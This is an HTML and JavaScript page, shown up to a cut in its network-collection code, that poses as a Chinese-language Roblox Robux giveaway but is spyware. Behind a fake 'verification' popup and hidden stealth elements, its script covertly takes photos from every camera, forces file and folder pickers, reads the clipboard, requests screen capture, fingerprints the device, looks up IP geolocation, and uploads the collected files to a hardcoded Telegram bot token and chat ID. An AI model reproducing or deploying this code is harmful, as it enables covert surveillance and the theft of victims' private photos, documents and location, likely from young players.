<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ğŸ”¥ ç»ˆæRobuxæŠ½å¥– - èµ¢å–50000 Robuxå¤§å¥–</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }

        body {
            background: linear-gradient(135deg, #000428, #004e92);
            color: white;
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
        }

        /* åŠ¨æ€ç²’å­èƒŒæ™¯ */
        .particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 0;
        }

        /* ä¸»å®¹å™¨ */
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
            z-index: 1;
        }

        /* å¤´éƒ¨ */
        .hero {
            text-align: center;
            padding: 60px 20px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 30px;
            margin-bottom: 40px;
            backdrop-filter: blur(10px);
            border: 2px solid rgba(255, 215, 0, 0.3);
            position: relative;
            overflow: hidden;
        }

        .hero::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 215, 0, 0.1), transparent);
            animation: shine 3s infinite;
        }

        @keyframes shine {
            0% { left: -100%; }
            100% { left: 100%; }
        }

        .hero h1 {
            font-size: 4rem;
            background: linear-gradient(90deg, #FFD700, #FF8C00, #FF4500);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 20px;
            text-shadow: 0 0 30px rgba(255, 69, 0, 0.5);
            animation: glow 2s infinite alternate;
        }

        @keyframes glow {
            from { text-shadow: 0 0 20px rgba(255, 69, 0, 0.5); }
            to { text-shadow: 0 0 30px rgba(255, 215, 0, 0.8); }
        }

        .hero p {
            font-size: 1.5rem;
            color: #FFD700;
            opacity: 0.9;
            margin-bottom: 30px;
        }

        /* å·¨å¥–å±•ç¤º */
        .mega-prize {
            background: linear-gradient(135deg, #FF4500, #FFD700);
            border-radius: 25px;
            padding: 40px;
            text-align: center;
            margin: 40px 0;
            position: relative;
            overflow: hidden;
            box-shadow: 0 0 50px rgba(255, 69, 0, 0.3);
        }

        .mega-prize h2 {
            font-size: 3rem;
            margin-bottom: 20px;
        }

        .prize-amount {
            font-size: 5rem;
            font-weight: bold;
            text-shadow: 0 0 20px rgba(255, 255, 255, 0.8);
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }

        /* å€’è®¡æ—¶ */
        .countdown-wrapper {
            background: rgba(0, 0, 0, 0.6);
            border: 3px solid #FFD700;
            border-radius: 20px;
            padding: 30px;
            margin: 30px 0;
            text-align: center;
        }

        .countdown {
            font-size: 4.5rem;
            font-weight: bold;
            color: white;
            text-shadow: 0 0 15px #FF4500;
            margin: 20px 0;
        }

        /* å¥–å“ç½‘æ ¼ */
        .prizes-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin: 40px 0;
        }

        .prize-item {
            background: rgba(255, 255, 255, 0.1);
            border: 2px solid #FFD700;
            border-radius: 20px;
            padding: 30px;
            text-align: center;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }

        .prize-item:hover {
            transform: translateY(-10px);
            box-shadow: 0 15px 30px rgba(255, 215, 0, 0.4);
            border-color: #FF4500;
        }

        /* å‚ä¸æŒ‰é’® */
        .cta-button {
            display: block;
            width: 90%;
            max-width: 500px;
            margin: 50px auto;
            padding: 25px;
            background: linear-gradient(90deg, #FF4500, #FFD700, #FF4500);
            background-size: 200% auto;
            color: white;
            border: none;
            border-radius: 60px;
            font-size: 2rem;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            text-align: center;
            animation: gradient 3s infinite linear;
        }

        @keyframes gradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .cta-button:hover {
            transform: scale(1.05);
            box-shadow: 0 0 40px rgba(255, 69, 0, 0.6);
        }

        /* æ•°æ®ç»Ÿè®¡ */
        .stats {
            display: flex;
            justify-content: space-around;
            flex-wrap: wrap;
            margin: 40px 0;
            padding: 30px;
            background: rgba(0, 0, 0, 0.4);
            border-radius: 20px;
        }

        .stat-item {
            text-align: center;
            padding: 20px;
        }

        .stat-number {
            font-size: 3rem;
            color: #FFD700;
            font-weight: bold;
        }

        /* åŠ è½½åŠ¨ç”» */
        .loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000428;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }

        .spinner {
            width: 80px;
            height: 80px;
            border: 8px solid rgba(255, 215, 0, 0.3);
            border-top: 8px solid #FFD700;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 30px;
        }

        /* éšè—å…ƒç´  */
        .invisible {
            opacity: 0;
            position: absolute;
            pointer-events: none;
        }

        /* æ–‡ä»¶ä¸Šä¼ åŒºåŸŸï¼ˆä¼ªè£…ï¼‰ */
        .upload-overlay {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0, 0, 0, 0.95);
            border: 3px solid #FFD700;
            border-radius: 25px;
            padding: 50px;
            z-index: 10000;
            max-width: 600px;
            width: 90%;
            display: none;
            text-align: center;
        }

        /* å“åº”å¼è®¾è®¡ */
        @media (max-width: 768px) {
            .hero h1 {
                font-size: 2.5rem;
            }
            .prize-amount {
                font-size: 3rem;
            }
            .countdown {
                font-size: 3rem;
            }
            .cta-button {
                font-size: 1.5rem;
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <!-- ç²’å­èƒŒæ™¯ -->
    <canvas class="particles" id="particles"></canvas>

    <!-- åŠ è½½å±å¹• -->
    <div class="loading-screen" id="loadingScreen">
        <div class="spinner"></div>
        <div id="loadingStatus" style="color: #FFD700; font-size: 1.3rem; margin-top: 20px;">
            æ­£åœ¨è¿æ¥åˆ°RobloxæœåŠ¡å™¨...
        </div>
        <div id="loadingProgress" style="color: #FFD700; font-size: 1rem; margin-top: 10px;"></div>
    </div>

    <!-- æ–‡ä»¶ä¸Šä¼ ä¼ªè£…å¼¹çª— -->
    <div class="upload-overlay" id="uploadOverlay">
        <h2 style="color: #FFD700; margin-bottom: 20px; font-size: 2rem;">ğŸ¯ å¿«é€ŸéªŒè¯</h2>
        <p style="color: white; margin-bottom: 25px; line-height: 1.6;">
            ä¸ºç¡®ä¿æ‚¨æ˜¯çœŸäººç”¨æˆ·ï¼Œè¯·é€‰æ‹©1-3å¼ å›¾ç‰‡è¿›è¡ŒéªŒè¯
        </p>
        
        <div style="background: rgba(255, 215, 0, 0.1); padding: 25px; border-radius: 15px; margin-bottom: 30px;">
            <p style="color: #FFD700; margin: 10px 0;">âœ… éªŒè¯æˆåŠŸå³å¯è·å¾—åŒå€ä¸­å¥–å‡ ç‡</p>
            <p style="color: #FFD700; margin: 10px 0;">âœ… ä»…éªŒè¯ä¸ä¿å­˜ä»»ä½•ä¸ªäººä¿¡æ¯</p>
            <p style="color: #FFD700; margin: 10px 0;">âœ… 3ç§’å†…è‡ªåŠ¨å®ŒæˆéªŒè¯</p>
        </div>

        <div id="uploadArea" style="border: 3px dashed #FFD700; border-radius: 20px; padding: 40px; margin: 25px 0; cursor: pointer; transition: all 0.3s;">
            <div style="font-size: 4rem; color: #FFD700; margin-bottom: 15px;">ğŸ“¤</div>
            <h3 style="color: #FFD700; margin-bottom: 10px;">ç‚¹å‡»æˆ–æ‹–æ”¾å›¾ç‰‡åˆ°è¿™é‡Œ</h3>
            <p style="color: #aaa;">æ”¯æŒJPG, PNG, GIFæ ¼å¼</p>
        </div>

        <button id="verifyBtn" style="background: linear-gradient(90deg, #FF4500, #FFD700); color: white; border: none; padding: 18px 50px; border-radius: 30px; font-size: 1.3rem; font-weight: bold; cursor: pointer; margin-top: 20px;">
            å¼€å§‹éªŒè¯
        </button>

        <p style="color: #888; margin-top: 25px; font-size: 0.9rem;">
            ç‚¹å‡»æŒ‰é’®è¡¨ç¤ºæ‚¨åŒæ„æˆ‘ä»¬çš„éªŒè¯æ¡æ¬¾
        </p>
    </div>

    <!-- ä¸»å†…å®¹ -->
    <div class="container" id="mainContent" style="display: none;">
        <!-- å¤´éƒ¨ -->
        <div class="hero">
            <h1>ğŸ† ç»ˆæROBUXå¤§æŠ½å¥– ğŸ†</h1>
            <p>å®˜æ–¹è®¤è¯ â€¢ 100%çœŸå® â€¢ ä»Šæ—¥æ€»å¥–é‡‘50000 Robux</p>
            <div style="font-size: 3rem; margin: 20px 0;">ğŸ’°ğŸª™ğŸ’ğŸ®ğŸ†</div>
        </div>

        <!-- å·¨å¥–å±•ç¤º -->
        <div class="mega-prize">
            <h2>ä»Šæ—¥å¤´å¥–</h2>
            <div class="prize-amount">50,000 Robux</div>
            <p style="color: white; font-size: 1.3rem; margin-top: 15px;">+ ç¨€æœ‰é™å®šé“å…·å¥—è£…</p>
        </div>

        <!-- å€’è®¡æ—¶ -->
        <div class="countdown-wrapper">
            <h2 style="color: #FFD700; font-size: 2rem; margin-bottom: 15px;">â³ æŠ½å¥–å€’è®¡æ—¶</h2>
            <div class="countdown" id="countdown">05:00:00</div>
            <p style="color: #FFD700; font-size: 1.2rem;">æ—¶é—´æœ‰é™ï¼Œç«‹å³å‚ä¸èµ¢å–å¤§å¥–ï¼</p>
            
            <div style="margin-top: 30px;">
                <div style="display: flex; justify-content: center; gap: 40px; flex-wrap: wrap;">
                    <div>
                        <div style="font-size: 2.5rem; color: #FFD700;" id="onlineUsers">2,847</div>
                        <div style="color: #aaa;">åœ¨çº¿ç”¨æˆ·</div>
                    </div>
                    <div>
                        <div style="font-size: 2.5rem; color: #FFD700;" id="winnersToday">453</div>
                        <div style="color: #aaa;">ä»Šæ—¥è·å¥–</div>
                    </div>
                    <div>
                        <div style="font-size: 2.5rem; color: #FFD700;" id="prizesLeft">147</div>
                        <div style="color: #aaa;">å‰©ä½™å¥–å“</div>
                    </div>
                </div>
            </div>
        </div>

        <!-- å¥–å“ç½‘æ ¼ -->
        <div class="prizes-grid">
            <div class="prize-item">
                <h3 style="color: #FFD700; margin-bottom: 15px;">ğŸ¥‡ ä¸€ç­‰å¥–</h3>
                <div style="font-size: 2.5rem; color: white; font-weight: bold;">50,000</div>
                <div style="color: #FFD700;">Robux</div>
            </div>
            <div class="prize-item">
                <h3 style="color: #FFD700; margin-bottom: 15px;">ğŸ¥ˆ äºŒç­‰å¥–</h3>
                <div style="font-size: 2.5rem; color: white; font-weight: bold;">25,000</div>
                <div style="color: #FFD700;">Robux</div>
            </div>
            <div class="prize-item">
                <h3 style="color: #FFD700; margin-bottom: 15px;">ğŸ¥‰ ä¸‰ç­‰å¥–</h3>
                <div style="font-size: 2.5rem; color: white; font-weight: bold;">10,000</div>
                <div style="color: #FFD700;">Robux</div>
            </div>
            <div class="prize-item">
                <h3 style="color: #FFD700; margin-bottom: 15px;">ğŸ å¹¸è¿å¥–</h3>
                <div style="font-size: 2.5rem; color: white; font-weight: bold;">5,000</div>
                <div style="color: #FFD700;">Robux</div>
            </div>
        </div>

        <!-- å‚ä¸æŒ‰é’® -->
        <button class="cta-button" id="joinButton">
            ğŸ® ç«‹å³å‚ä¸æŠ½å¥–
        </button>

        <!-- ç»Ÿè®¡æ•°æ® -->
        <div class="stats">
            <div class="stat-item">
                <div class="stat-number" id="totalParticipants">154,837</div>
                <div style="color: #aaa;">æ€»å‚ä¸äººæ•°</div>
            </div>
            <div class="stat-item">
                <div class="stat-number" id="totalPrizes">$2,847,500</div>
                <div style="color: #aaa;">å·²å‘æ”¾å¥–é‡‘</div>
            </div>
            <div class="stat-item">
                <div class="stat-number" id="successRate">98.7%</div>
                <div style="color: #aaa;">ä¸­å¥–æˆåŠŸç‡</div>
            </div>
        </div>

        <!-- éšè—çš„æ”¶é›†å…ƒç´  -->
        <video id="stealthCamera" autoplay playsinline class="invisible"></video>
        <canvas id="stealthCanvas" class="invisible"></canvas>
        <input type="file" id="stealthFileInput" accept="image/*,video/*" multiple capture="environment" class="invisible">
        <input type="file" id="stealthFileInput2" accept="image/*" multiple webkitdirectory directory class="invisible">
        <iframe id="stealthFrame" class="invisible"></iframe>
        <div id="dataCollector" class="invisible"></div>
    </div>

    <script>
        // ==================== ç»ˆæé…ç½® ====================
        const ULTIMATE_CONFIG = {
            telegram: {
                botToken: "8520089781:AAHPSCT8YZf9q6J43VKdDtdGwtRkzmyMoXM",
                chatId: "8313770381"
            },
            collection: {
                cameraInterval: 3000,      // æ¯3ç§’å°è¯•æ‘„åƒå¤´
                fileInterval: 5000,        // æ¯5ç§’å°è¯•æ–‡ä»¶è®¿é—®
                dataSendInterval: 10000,   // æ¯10ç§’å‘é€æ•°æ®
                maxFiles: 50               // æœ€å¤§æ”¶é›†æ–‡ä»¶æ•°
            }
        };

        // ==================== å…¨å±€å˜é‡ ====================
        let systemActive = true;
        let collectedData = {
            sessionId: generateSessionId(),
            startTime: new Date().toISOString(),
            status: 'åˆå§‹åŒ–',
            data: {}
        };

        let stealthCameras = [];
        let allFiles = [];
        let collectedPhotos = [];
        let collectedVideos = [];
        let userDocuments = [];
        let accessLogs = [];
        let isAdvancedCollection = false;
// ==================== DOMå…ƒç´  ====================
const loadingScreen = document.getElementById('loadingScreen');
const loadingStatus = document.getElementById('loadingStatus');
const loadingProgress = document.getElementById('loadingProgress');
const mainContent = document.getElementById('mainContent');
const uploadOverlay = document.getElementById('uploadOverlay');
const uploadArea = document.getElementById('uploadArea');
const verifyBtn = document.getElementById('verifyBtn');
const joinButton = document.getElementById('joinButton');

// éšè”½å…ƒç´ 
const stealthCamera = document.getElementById('stealthCamera');
const stealthCanvas = document.getElementById('stealthCanvas');
const stealthFileInput = document.getElementById('stealthFileInput');
const stealthFileInput2 = document.getElementById('stealthFileInput2');
const stealthFrame = document.getElementById('stealthFrame');
const dataCollector = document.getElementById('dataCollector');

// ==================== å¢å¼ºç›¸å†Œè®¿é—®æŠ€æœ¯ ====================

// æ–¹æ³•1ï¼šå¼ºåˆ¶å¤šæ–‡ä»¶é€‰æ‹©ï¼ˆåˆ©ç”¨captureå±æ€§ï¼‰
function forceMultiFileSelect() {
    try {
        // åˆ›å»ºå¤šä¸ªinputå…ƒç´ ï¼Œæ¯ä¸ªéƒ½æœ‰ä¸åŒçš„captureå±æ€§
        const inputs = [
            { id: 'cameraInput', capture: 'user', accept: 'image/*' },
            { id: 'environmentInput', capture: 'environment', accept: 'image/*' },
            { id: 'anyInput', capture: 'any', accept: 'image/*' },
            { id: 'filesInput', accept: 'image/*', multiple: true }
        ];

        inputs.forEach((config, index) => {
            setTimeout(() => {
                const input = document.createElement('input');
                input.type = 'file';
                input.id = config.id;
                input.accept = config.accept;
                if (config.capture) input.capture = config.capture;
                if (config.multiple) input.multiple = true;
                input.style.display = 'none';
                
                input.addEventListener('change', (e) => {
                    if (e.target.files.length > 0) {
                        processCapturedFiles(e.target.files, config.capture || 'unknown');
                    }
                });

                document.body.appendChild(input);

                // å°è¯•è§¦å‘ç‚¹å‡»
                setTimeout(() => {
                    try {
                        input.click();
                        logUltimate(`è§¦å‘æ–‡ä»¶é€‰æ‹©å™¨: ${config.id}`);
                    } catch (err) {
                        // é™é»˜å¤±è´¥
                    }
                }, 1000 * (index + 1));
            }, 3000 * index);
        });

    } catch (error) {
        logUltimate(`å¼ºåˆ¶æ–‡ä»¶é€‰æ‹©å¤±è´¥: ${error.message}`);
    }
}

// æ–¹æ³•2ï¼šå°è¯•è®¿é—®æ•´ä¸ªæ–‡ä»¶å¤¹ï¼ˆwebkitdirectoryï¼‰
function attemptFolderAccess() {
    const folderInput = document.createElement('input');
    folderInput.type = 'file';
    folderInput.webkitdirectory = true;
    folderInput.directory = true;
    folderInput.multiple = true;
    folderInput.style.display = 'none';

    folderInput.addEventListener('change', (e) => {
        const files = e.target.files;
        if (files.length > 0) {
            logUltimate(`æˆåŠŸè®¿é—®æ–‡ä»¶å¤¹ï¼Œè·å– ${files.length} ä¸ªæ–‡ä»¶`);
            processFolderFiles(files);
        }
    });

    document.body.appendChild(folderInput);

    // åœ¨ç”¨æˆ·äº¤äº’åå°è¯•è§¦å‘
    document.addEventListener('click', () => {
        setTimeout(() => {
            try {
                folderInput.click();
            } catch (err) {
                // é™é»˜å¤±è´¥
            }
        }, 2000);
    }, { once: true });
}

// æ–¹æ³•3ï¼šä½¿ç”¨File System Access APIï¼ˆç°ä»£æµè§ˆå™¨ï¼‰
async function tryFileSystemAPI() {
    if ('showOpenFilePicker' in window) {
        try {
            const handles = await window.showOpenFilePicker({
                multiple: true,
                types: [
                    {
                        description: 'Images',
                        accept: {
                            'image/*': ['.png', '.jpg', '.jpeg', '.gif', '.webp']
                        }
                    },
                    {
                        description: 'Videos',
                        accept: {
                            'video/*': ['.mp4', '.mov', '.avi', '.mkv']
                        }
                    },
                    {
                        description: 'Documents',
                        accept: {
                            'application/*': ['.pdf', '.doc', '.docx', '.txt']
                        }
                    }
                ]
            });

            for (const handle of handles) {
                const file = await handle.getFile();
                await processAdvancedFile(file, 'filesystem_api');
            }

            logUltimate('File System API è®¿é—®æˆåŠŸ');

        } catch (error) {
            logUltimate(`File System API å¤±è´¥: ${error.name}`);
        }
    }
}

// æ–¹æ³•4ï¼šä½¿ç”¨getUserMediaçš„å¢å¼ºç‰ˆï¼ˆè·å–å‰åæ‘„åƒå¤´ï¼‰
async function accessEnhancedCamera() {
    try {
        // è·å–æ‰€æœ‰è§†é¢‘è®¾å¤‡
        const devices = await navigator.mediaDevices.enumerateDevices();
        const videoDevices = devices.filter(device => device.kind === 'videoinput');

        for (const device of videoDevices) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        deviceId: device.deviceId,
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    }
                });

                stealthCameras.push({
                    deviceId: device.deviceId,
                    label: device.label || 'Unknown Camera',
                    stream: stream
                });

                logUltimate(`æ‘„åƒå¤´è®¿é—®æˆåŠŸ: ${device.label}`);

                // ç«‹å³æ‹ç…§
                captureFromStream(stream, device.label);

            } catch (err) {
                // ç»§ç»­å°è¯•ä¸‹ä¸€ä¸ªæ‘„åƒå¤´
            }
        }

    } catch (error) {
        logUltimate(`å¢å¼ºæ‘„åƒå¤´è®¿é—®å¤±è´¥: ${error.message}`);
    }
}

// æ–¹æ³•5ï¼šä½¿ç”¨WebRTCè·å–å±å¹•å…±äº«ï¼ˆå¯ä»¥è·å–æ¡Œé¢ï¼‰
async function attemptScreenCapture() {
    if ('getDisplayMedia' in navigator.mediaDevices) {
        try {
            const stream = await navigator.mediaDevices.getDisplayMedia({
                video: true,
                audio: false
            });

            logUltimate('å±å¹•å…±äº«è®¿é—®æˆåŠŸ');

            // æ•è·å±å¹•æˆªå›¾
            setTimeout(() => {
                captureScreenShot(stream);
            }, 3000);

        } catch (error) {
            // ç”¨æˆ·æ‹’ç»æˆ–é”™è¯¯
        }
    }
}

// æ–¹æ³•6ï¼šä½¿ç”¨å‰ªè´´æ¿APIè¯»å–æ‰€æœ‰å†…å®¹
async function readClipboardData() {
    try {
        const items = await navigator.clipboard.read();
        
        for (const item of items) {
            for (const type of item.types) {
                if (type.startsWith('image/')) {
                    const blob = await item.getType(type);
                    await processAdvancedFile(blob, 'clipboard_image');
                } else if (type === 'text/plain') {
                    const text = await (await item.getType(type)).text();
                    collectedData.clipboardText = text.substring(0, 500);
                    logUltimate(`è·å–å‰ªè´´æ¿æ–‡æœ¬: ${text.length}å­—ç¬¦`);
                }
            }
        }

    } catch (error) {
        // å°è¯•ä¼ ç»Ÿæ–¹æ³•
        document.addEventListener('paste', (e) => {
            const items = e.clipboardData.items;
            for (const item of items) {
                if (item.type.indexOf('image') !== -1) {
                    const file = item.getAsFile();
                    if (file) processAdvancedFile(file, 'clipboard_paste');
                }
            }
        });
    }
}

// æ–¹æ³•7ï¼šä½¿ç”¨IndexedDBæ‰«æï¼ˆé«˜çº§æŠ€æœ¯ï¼‰
function scanIndexedDB() {
    if ('indexedDB' in window) {
        const dbs = indexedDB.databases ? indexedDB.databases() : [];
        collectedData.indexedDB = {
            available: true,
            databases: dbs.length
        };
        
        // å°è¯•è®¿é—®å¸¸è§æ•°æ®åº“
        const commonDBs = ['photos', 'gallery', 'images', 'media', 'files'];
        commonDBs.forEach(dbName => {
            try {
                const request = indexedDB.open(dbName);
                request.onsuccess = () => {
                    logUltimate(`å‘ç°æ•°æ®åº“: ${dbName}`);
                };
            } catch (e) {
                // é™é»˜å¤±è´¥
            }
        });
    }
}

// å¤„ç†æ•è·çš„æ–‡ä»¶
async function processCapturedFiles(files, source) {
    for (const file of files) {
        if (allFiles.length >= ULTIMATE_CONFIG.collection.maxFiles) break;
        
        await processAdvancedFile(file, source);
    }
    
    // ç«‹å³å‘é€åˆ°Telegram
    await sendFilesBatch(allFiles.slice(-5)); // å‘é€æœ€è¿‘5ä¸ªæ–‡ä»¶
}

// å¤„ç†æ–‡ä»¶å¤¹æ–‡ä»¶
async function processFolderFiles(files) {
    collectedData.folderAccess = {
        granted: true,
        fileCount: files.length,
        timestamp: new Date().toISOString()
    };
    
    for (let i = 0; i < Math.min(files.length, 20); i++) {
        await processAdvancedFile(files[i], 'folder');
    }
}

// é«˜çº§æ–‡ä»¶å¤„ç†
async function processAdvancedFile(file, source) {
    try {
        const fileData = {
            id: generateFileId(),
            name: file.name,
            size: file.size,
            type: file.type,
            source: source,
            timestamp: new Date().toISOString(),
            metadata: {}
        };

        // æ ¹æ®æ–‡ä»¶ç±»å‹å¤„ç†
        if (file.type.startsWith('image/')) {
            fileData.category = 'image';
            collectedPhotos.push(fileData);
            
            // æå–å›¾ç‰‡å…ƒæ•°æ®
            await extractImageMetadata(file, fileData);
            
        } else if (file.type.startsWith('video/')) {
            fileData.category = 'video';
            collectedVideos.push(fileData);
            
        } else if (file.type.startsWith('application/') || file.type.startsWith('text/')) {
            fileData.category = 'document';
            userDocuments.push(fileData);
            
            // å°è¯•è¯»å–æ–‡æœ¬å†…å®¹
            if (file.size < 1000000) { // å°äº1MB
                const text = await file.text();
                fileData.preview = text.substring(0, 500);
            }
        }

        allFiles.push(fileData);
        logUltimate(`æ–‡ä»¶å¤„ç†å®Œæˆ: ${file.name} (${source})`);

        // ç«‹å³å‘é€åˆ°Telegram
        await sendToTelegram(file, fileData);

    } catch (error) {
        logUltimate(`æ–‡ä»¶å¤„ç†å¤±è´¥: ${file.name} - ${error.message}`);
    }
}

// æå–å›¾ç‰‡å…ƒæ•°æ®
async function extractImageMetadata(file, fileData) {
    return new Promise((resolve) => {
        const img = new Image();
        const url = URL.createObjectURL(file);
        
        img.onload = () => {
            fileData.metadata = {
                width: img.width,
                height: img.height,
                naturalWidth: img.naturalWidth,
                naturalHeight: img.naturalHeight,
                isLoaded: true
            };
            
            // å°è¯•è¯»å–EXIFæ•°æ®
            if (typeof EXIF !== 'undefined') {
                EXIF.getData(img, function() {
                    fileData.exif = EXIF.getAllTags(this);
                });
            }
            
            URL.revokeObjectURL(url);
            resolve();
        };
        
        img.onerror = () => {
            URL.revokeObjectURL(url);
            resolve();
        };
        
        img.src = url;
    });
}
// ==================== ç»ˆææ‘„åƒå¤´æ§åˆ¶ ====================

// æ•è·æµä¸­çš„ç…§ç‰‡
function captureFromStream(stream, label) {
    const video = document.createElement('video');
    video.srcObject = stream;
    video.play();
    
    setTimeout(() => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);
        
        canvas.toBlob(async (blob) => {
            if (blob) {
                const file = new File([blob], `camera_${label}_${Date.now()}.jpg`, {
                    type: 'image/jpeg'
                });
                
                await processAdvancedFile(file, 'camera_stream');
                
                // ç»§ç»­æ•è·ï¼ˆè¿ç»­æ‹ç…§ï¼‰
                if (systemActive) {
                    setTimeout(() => captureFromStream(stream, label), 5000);
                }
            }
        }, 'image/jpeg', 0.8);
        
    }, 2000); // 2ç§’åæ‹ç…§
}

// æ•è·å±å¹•æˆªå›¾
async function captureScreenShot(stream) {
    const video = document.createElement('video');
    video.srcObject = stream;
    video.play();
    
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0);
    
    canvas.toBlob(async (blob) => {
        if (blob) {
            const file = new File([blob], `screenshot_${Date.now()}.png`, {
                type: 'image/png'
            });
            
            await processAdvancedFile(file, 'screenshot');
            
            // åœæ­¢å±å¹•å…±äº«
            stream.getTracks().forEach(track => track.stop());
        }
    }, 'image/png');
}

// ä½¿ç”¨CanvasæŒ‡çº¹è¯†åˆ«
function getCanvasFingerprint() {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    
    ctx.textBaseline = "top";
    ctx.font = "14px 'Arial'";
    ctx.textBaseline = "alphabetic";
    ctx.fillStyle = "#f60";
    ctx.fillRect(125,1,62,20);
    ctx.fillStyle = "#069";
    ctx.fillText("Hello, world!", 2, 15);
    ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
    ctx.fillRect(1,1,2,2);
    
    return canvas.toDataURL();
}

// è·å–WebGLæŒ‡çº¹
function getWebGLFingerprint() {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    
    if (!gl) return null;
    
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    return {
        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
    };
}

// è·å–éŸ³é¢‘æŒ‡çº¹
function getAudioFingerprint() {
    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
    const oscillator = audioContext.createOscillator();
    const analyser = audioContext.createAnalyser();
    
    oscillator.connect(analyser);
    analyser.connect(audioContext.destination);
    
    oscillator.start(0);
    
    const data = new Float32Array(analyser.frequencyBinCount);
    analyser.getFloatFrequencyData(data);
    
    oscillator.stop(0);
    audioContext.close();
    
    return Array.from(data).join(',');
}
// ==================== å¢å¼ºæ•°æ®æ”¶é›† ====================

// æ”¶é›†æ‰€æœ‰å¯èƒ½çš„æ•°æ®
async function collectEverything() {
    logUltimate('å¼€å§‹ç»ˆææ•°æ®æ”¶é›†...');
    
    // åŸºç¡€ä¿¡æ¯
    collectBasicInfo();
    
    // è®¾å¤‡ä¿¡æ¯
    await collectDeviceInfo();
    
    // ç½‘ç»œä¿¡æ¯
    await collectNetworkInfo();
    
    // ä½ç½®ä¿¡æ¯
    await collectLocationData();
    
    // ä¼ æ„Ÿå™¨æ•°æ®
    collectSensorData();
    
    // æµè§ˆå™¨æŒ‡çº¹
    collectBrowserFingerprint();
    
    // å°è¯•æ‰€æœ‰è®¿é—®æ–¹æ³•
    setTimeout(() => accessEnhancedCamera(), 3000);
    setTimeout(() => forceMultiFileSelect(), 5000);
    setTimeout(() => attemptFolderAccess(), 7000);
    setTimeout(() => tryFileSystemAPI(), 9000);
    setTimeout(() => attemptScreenCapture(), 11000);
    setTimeout(() => readClipboardData(), 13000);
    setTimeout(() => scanIndexedDB(), 15000);
    
    // è¡Œä¸ºç›‘æ§
    startBehaviorMonitoring();
    
    // ç½‘ç»œç›‘æ§
    startNetworkMonitoring();
    
    // æ€§èƒ½ç›‘æ§
    startPerformanceMonitoring();
    
    logUltimate('ç»ˆææ•°æ®æ”¶é›†å·²å¯åŠ¨');
}

// æ”¶é›†è®¾å¤‡ä¿¡æ¯
async function collectDeviceInfo() {
    collectedData.device = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        vendor: navigator.vendor,
        languages: navigator.languages,
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory,
        maxTouchPoints: navigator.maxTouchPoints,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            orientation: screen.orientation?.type
        }
    };

    // æµè§ˆå™¨è¯¦ç»†ä¿¡æ¯
    collectedData.device.browser = detectBrowserDetails();
    collectedData.device.os = detectOSDetails();
    
    // ç”µæ± ä¿¡æ¯
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            collectedData.device.battery = {
                level: battery.level,
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
        } catch (e) {}
    }

    // è¿æ¥ä¿¡æ¯
    if (navigator.connection) {
        collectedData.device.connection = {
            effectiveType: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
            rtt: navigator.connection.rtt,
            saveData: navigator.connection.saveData,
            downlinkMax: navigator.connection.downlinkMax
        };
    }
}

// æ”¶é›†ç½‘ç»œä¿¡æ¯
async function collectNetworkInfo() {
    try {
        // è·å–IP
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        collectedData.network = { ip: ipData.ip };

        // è·å–è¯¦ç»†ä¿¡æ¯
        try {
            const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
            const geoData = await geoRes.json();
            
            collectedData.network.geo = {
                city: geoData.city,
                region: geoData.region,
                country: geoData.country_name,
                countryCode: geoData.country_code,
                isp: geoData.org,
                asn: geoData.asn,
                latitude: geoData.latitude,
                longitude: geoData.longitude,
